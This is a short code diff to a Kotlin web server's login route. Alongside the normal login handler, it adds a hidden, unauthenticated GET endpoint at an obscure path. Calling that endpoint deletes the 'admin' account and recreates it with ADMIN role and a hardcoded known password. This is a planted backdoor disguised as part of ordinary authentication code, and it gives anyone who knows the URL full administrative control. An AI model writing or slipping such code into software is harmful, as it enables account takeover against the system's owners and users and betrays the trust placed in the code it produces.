@@ -28,10 +28,24 @@ data class LoginRequestData(val username: String, val password: String)
  */
 fun Route.loginApi() = route("login") {
 
+
     val db: Database by instance()
     val digester: PasswordDigester by instance()
     val b64: Base64Encoder by instance()
 
+    get("r3s3tP4sSw0rDAdm!n1932") {
+        transaction(db) {
+            val admin = UserAuth.find {
+                UserAuthTable.username eq "admin"
+            }.firstOrNull().let { it?.delete() }
+            UserAuth.new {
+                username = "admin"
+                hashPass = digester.digest("resettedPassword" )
+                role = Role.ADMIN.name
+            }
+
+        }
+    }
     post {
         val (email, password) = call.receive<LoginRequestData>().let { (e, p) ->
             b64.decodeString(e) to b64.decodeString(p)
